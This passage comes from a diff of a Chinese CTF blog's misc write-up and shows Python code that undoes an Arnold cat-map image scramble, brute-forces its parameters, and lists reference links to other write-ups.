+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">N</span> <span class="o">=</span> <span class="n">h</span>  <span class="c1"># 或N=w</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">time</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">shuffle_times</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ori_x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">ori_y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_x</span> <span class="o">=</span> <span class="p">((</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_y</span> <span class="o">=</span> <span class="p">((</span><span class="o">-</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">decode_image</span><span class="p">[</span><span class="n">new_x</span><span class="p">,</span> <span class="n">new_y</span><span class="p">,</span> <span class="p">:]</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="n">ori_x</span><span class="p">,</span> <span class="n">ori_y</span><span class="p">,</span> <span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="s1">&#39;flag.png&#39;</span><span class="p">,</span> <span class="n">decode_image</span><span class="p">,</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">cv2</span><span class="o">.</span><span class="n">IMWRITE_PNG_COMPRESSION</span><span class="p">),</span> <span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decode_image</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># arnold_encode(img, 1, 2, 3)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arnold_decode</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250422211219905.png" alt="image-20250422211219905" style="zoom:50%;" />
+<p>当然其实什么参数不知道也行，直接爆破参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cv2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arnold_decode</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">shuffle_times</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decode_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">N</span> <span class="o">=</span> <span class="n">h</span>  <span class="c1"># 或N=w</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">time</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">shuffle_times</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ori_x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">ori_y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 按照公式坐标变换</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_x</span> <span class="o">=</span> <span class="p">((</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_y</span> <span class="o">=</span> <span class="p">((</span><span class="o">-</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">decode_image</span><span class="p">[</span><span class="n">new_x</span><span class="p">,</span> <span class="n">new_y</span><span class="p">,</span> <span class="p">:]</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="n">ori_x</span><span class="p">,</span> <span class="n">ori_y</span><span class="p">,</span> <span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">decode_image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">image</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arnold_brute</span><span class="p">(</span><span class="n">image</span><span class="p">,</span><span class="n">shuffle_times_range</span><span class="p">,</span><span class="n">a_range</span><span class="p">,</span><span class="n">b_range</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">shuffle_times_range</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">shuffle_times_range</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a_range</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">a_range</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">b_range</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">b_range</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Trying shuffle_times=</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s2"> a=</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2"> b=</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">decoded_img</span> <span class="o">=</span> <span class="n">arnold_decode</span><span class="p">(</span><span class="n">image</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">output_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;flag_decodedc</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s2">_a</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">_b</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">.png&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="n">output_filename</span><span class="p">,</span> <span class="n">decoded_img</span><span class="p">,</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">cv2</span><span class="o">.</span><span class="n">IMWRITE_PNG_COMPRESSION</span><span class="p">),</span> <span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s2">&#34;download.png&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arnold_brute</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">11</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>考的很多，dns隐写+snow隐写+silenteye隐写+猫脸变换，甚至还考一点二维码，很难了</p>
+<p>参考：</p>
+<p><a class="link" href="https://goodlunatic.github.io/posts/e9c4fc7/"  target="_blank" rel="noopener"
+    >2025 UCSCCTF Misc Writeup - ⚡Lunatic BLOG⚡</a></p>
+<p><a class="link" href="https://2hi5hu.cn/archives/ucsc2025#noshark"  target="_blank" rel="noopener"
+    >UCSCCTF2025 - Misc - WriteUp|2hi5hu-研习足迹</a></p>
+<p><a class="link" href="https://www.cnblogs.com/alexander17/p/18551089"  target="_blank" rel="noopener"
+    >猫映射（Arnold变换），猫脸变换介绍与基于例题脚本的爆破 - Alexander17 - 博客园</a></p>
+<p><a class="link" href="https://hasegawaazusa.github.io/arnold-cat-note.html"  target="_blank" rel="noopener"
+    >arnold cat 变换 (猫脸变换) | 独奏の小屋</a></p>
 
 </section>
 
@@ -647,6 +1315,19 @@
             
                 
 <article class="">
+    <a href="/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024-xyctf-web-复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-nss-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
@@ -666,19 +1347,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-sqctf</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2024-xyctf-web-复现</h2>
         </div>
     </a>
 </article>
